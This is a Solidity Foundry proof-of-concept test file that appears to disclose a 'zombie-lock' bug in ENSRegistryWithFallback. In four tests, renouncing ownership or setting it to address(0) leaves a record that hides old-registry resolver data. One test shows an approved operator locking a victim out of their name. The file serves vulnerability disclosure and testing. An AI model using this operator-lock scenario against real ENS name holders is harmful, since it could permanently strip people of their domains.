// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "../contracts/ENSRegistry.sol";
import "../contracts/ENSRegistryWithFallback.sol";

// Minimal Forge cheatcode interface — works with any Solidity version
interface Vm {
    function startPrank(address sender) external;
    function stopPrank() external;
}

/// @notice Foundry PoC — ENSRegistryWithFallback._setOwner zombie-lock
///
/// Run:   forge test --match-contract ZombieLockTest -vv
///
/// Convention: each test describes EXPECTED correct behaviour.
///             Bug present → test FAILS.
///             Bug fixed   → test PASSES.
contract ZombieLockTest {
    Vm internal constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12d);

    ENSRegistry             internal old;
    ENSRegistryWithFallback internal reg;

    address internal constant ETH_TLD_MGR   = address(0x1000000000000000000000000000000000000001);
    address internal constant ALICE          = address(0x1111111111111111111111111111111111111111);
    address internal constant OPERATOR       = address(0x2222222222222222222222222222222222222222);
    address internal constant BOB            = address(0x3333333333333333333333333333333333333333);
    address internal constant RESOLVER_ADDR  = address(0x4444444444444444444444444444444444444444);

    bytes32 internal constant ZERO_HASH = bytes32(0);

    bytes32 internal ethNode;
    bytes32 internal aliceNode;
    bytes32 internal bobNode;

    function setUp() public {
        old = new ENSRegistry();
        reg = new ENSRegistryWithFallback(ENS(address(old)));

        ethNode   = keccak256(abi.encodePacked(ZERO_HASH, keccak256(abi.encodePacked("eth"))));
        aliceNode = keccak256(abi.encodePacked(ethNode,   keccak256(abi.encodePacked("alice"))));
        bobNode   = keccak256(abi.encodePacked(ethNode,   keccak256(abi.encodePacked("bob"))));

        // address(this) is root; ETH_TLD_MGR manages eth TLD (mirrors BaseRegistrar role)
        reg.setSubnodeOwner(ZERO_HASH, keccak256(abi.encodePacked("eth")), ETH_TLD_MGR);

        vm.startPrank(ETH_TLD_MGR);
        reg.setSubnodeOwner(ethNode, keccak256(abi.encodePacked("alice")), ALICE);
        vm.stopPrank();
    }

    // ── FAIL #1 ──────────────────────────────────────────────────────────────
    // Expected: setOwner(node, address(0)) clears the record.
    //           owner()==address(0)  AND  recordExists()==false  must agree.
    // Bug:      _setOwner stores address(this) instead of address(0), so
    //           recordExists() returns true while owner() returns address(0).
    //           The require below reverts → TEST FAILS.

    function test_RecordAbsentAfterRenounce() public {
        vm.startPrank(ALICE);
        reg.setOwner(aliceNode, address(0));
        vm.stopPrank();

        require(
            !reg.recordExists(aliceNode),
            "BUG: owner()==address(0) but recordExists()==true — zombie state"
        );
    }

    // ── FAIL #2 ──────────────────────────────────────────────────────────────
    // Expected: if owner is set to address(0) via setSubnodeOwner, the new
    //           registry should fall back to the old registry for resolver data.
    // Bug:      zombie lock sets recordExists==true, suppressing the fallback.
    //           Old-registry resolver is permanently hidden.
    //           The require below reverts → TEST FAILS.

    function test_FallbackWorksWhenNewOwnerIsZero() public {
        // bob.eth exists only in the OLD registry with a known resolver
        old.setSubnodeOwner(ZERO_HASH, keccak256(abi.encodePacked("eth")), address(this));
        old.setSubnodeOwner(ethNode, keccak256(abi.encodePacked("bob")), BOB);

        vm.startPrank(BOB);
        old.setResolver(bobNode, RESOLVER_ADDR);
        vm.stopPrank();

        // Sanity: before any write, new registry falls back correctly
        require(reg.resolver(bobNode) == RESOLVER_ADDR, "setup broken");

        // ETH TLD manager sets bob.eth owner to address(0) in new registry
        vm.startPrank(ETH_TLD_MGR);
        reg.setSubnodeOwner(ethNode, keccak256(abi.encodePacked("bob")), address(0));
        vm.stopPrank();

        // Expected: owner==address(0) → recordExists==false → fallback to old registry
        // Bug: fallback silenced → returns address(0) instead of RESOLVER_ADDR
        require(
            reg.resolver(bobNode) == RESOLVER_ADDR,
            "BUG: resolver() returns address(0) — old-registry fallback permanently silenced"
        );
    }

    // ── FAIL #3 ──────────────────────────────────────────────────────────────
    // Expected: a victim whose domain was zombie-locked by a malicious operator
    //           can recover it by calling setOwner(node, self) —
    //           analogous to what BaseRegistrar.reclaim() achieves for .eth names.
    // Bug:      authorised(aliceNode) reads address(reg) from storage and always
    //           reverts, so ALICE cannot directly reclaim.
    //           The setOwner call reverts → TEST FAILS.

    function test_VictimCanDirectlyReclaimAfterOperatorZombies() public {
        // Alice grants OPERATOR — standard practice (marketplace, manager app)
        vm.startPrank(ALICE);
        reg.setApprovalForAll(OPERATOR, true);
        vm.stopPrank();

        // Operator zombie-locks alice.eth in one transaction
        vm.startPrank(OPERATOR);
        reg.setOwner(aliceNode, address(0));
        vm.stopPrank();

        // Alice should be able to directly reclaim her domain
        // Bug: reverts — alice is permanently locked out without ETH_TLD_MGR help
        vm.startPrank(ALICE);
        reg.setOwner(aliceNode, ALICE);
        vm.stopPrank();
    }

    // ── FAIL #4 ──────────────────────────────────────────────────────────────
    // Expected: a node's resolver can be updated by its owner at any time.
    //           After setOwner(node, address(0)), the node appears unowned, so
    //           at minimum setResolver should revert with a clear auth error
    //           and the old resolver value should be readable via fallback.
    // Bug:      zombie lock means even reading the resolver of a migrated node
    //           returns address(0) instead of the old-registry value — data loss.
    //           Additionally, the owner can never call setResolver again.
    //           The require below reverts → TEST FAILS.

    function test_OwnerCanReadOldResolverAfterRenounce() public {
        // Give alice.eth a resolver in old registry too (simulates migrated-but-has-old-data)
        old.setSubnodeOwner(ZERO_HASH, keccak256(abi.encodePacked("eth")), address(this));
        old.setSubnodeOwner(ethNode, keccak256(abi.encodePacked("alice")), ALICE);

        vm.startPrank(ALICE);
        old.setResolver(aliceNode, RESOLVER_ADDR);
        vm.stopPrank();

        // Alice renounces in new registry
        vm.startPrank(ALICE);
        reg.setOwner(aliceNode, address(0));
        vm.stopPrank();

        // Expected: owner==address(0) → recordExists==false → fallback returns old resolver
        // Bug: zombie → fallback silenced → resolver returns address(0) not RESOLVER_ADDR
        require(
            reg.resolver(aliceNode) == RESOLVER_ADDR,
            "BUG: resolver() returns address(0) — old resolver data permanently lost after renounce"
        );
    }
}
